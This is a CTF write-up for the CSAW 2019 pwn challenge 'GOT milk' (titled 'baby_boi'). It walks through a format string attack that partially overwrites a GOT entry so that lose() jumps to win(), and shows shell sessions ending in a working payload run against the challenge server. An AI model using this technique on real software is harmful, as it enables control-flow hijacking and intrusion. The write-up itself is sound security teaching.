# baby_boi

Category: `pwn`

Description: `GlobalOffsetTable milk?`

Service: `nc pwn.chal.csaw.io 1004`

Points: `50`

**Files**
- [gotmilk](files/gotmilk)
- [libmylib.so](files/libmylib.so)

### What It Does

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ file gotmilk 
gotmilk: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=703440832efdbe6e4cbf734b303a31c4da7eb4e2, with debug_info, not stripped
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

The 32-bit binary calls `lose()`, reads user input and calls `lose()` again.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ ./gotmilk 
Simulating loss...

No flag for you!
Hey you! GOT milk? 123
Your answer: 123

No flag for you!
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

The binary is non-PIE, disabling ASLR.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ checksec gotmilk
[*] '/home/ubuntu/ctf/2019/csaw_ctf_quals/pwn/gotmilk'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

### How to Solve

This is a GOT overwrite format string attack. We have to overwrite the value of `lose@got`, which is the address of `lose@libmylib`, to the address of `win@libmylib`.

First, we get the offset of our input on the stack.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ ./gotmilk 
Simulating loss...

No flag for you!
Hey you! GOT milk? AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Your answer: AAAA 64 f7f6f5c0 804866f 0 1 f7fca940 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520

No flag for you!
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

Our input is at `7`.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ ./gotmilk 
Simulating loss...

No flag for you!
Hey you! GOT milk? AAAA %7$x
Your answer: AAAA 41414141

No flag for you!
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

Next, we get the address of `lose@got`. The address is consistent since ASLR is disabled.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ readelf -r gotmilk | grep lose
0804a010  00000307 R_386_JUMP_SLOT   00000000   lose
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

The address of `lose@got` is `0x0804a010`.

Then, we get the offset of `lose@libmylib` and `win@libmylib`.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ objdump -d libmylib.so | egrep 'lose>:|win>:'
00001189 <win>:
000011f8 <lose>:
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

Notice that the offset of `lose@libmylib` and `win@libmylib` only differs in their last byte. The last byte of the addresses in the shared library will not be affected by ASLR. Hence, we only need to overwrite 1 byte of the value of `lose@got` to point to `win@libmylib`.

To overwrite the byte to `0x89`, we need to print `133` characters after the address of `lose@got`.

```shellsession
In [1]: 0x89 - 4
Out[1]: 133
```

Putting it together and test against the binary.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ python -c 'import struct; print struct.pack("I", 0x0804a010) + "%133x%7$hhn"' | ./gotmilk
Simulating loss...

No flag for you!
Hey you! GOT milk? Your answer:                                                                                                                                     64
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

Get the flag from the server.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ python -c 'import struct; print struct.pack("I", 0x0804a010) + "%133x%7$hhn"' | nc pwn.chal.csaw.io 1004
Simulating loss...

No flag for you!
Hey you! GOT milk? Your answer:                                                                                                                                     64
flag{y0u_g00000t_mi1k_4_M3!?}
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

**Flag: `flag{y0u_g00000t_mi1k_4_M3!?}`**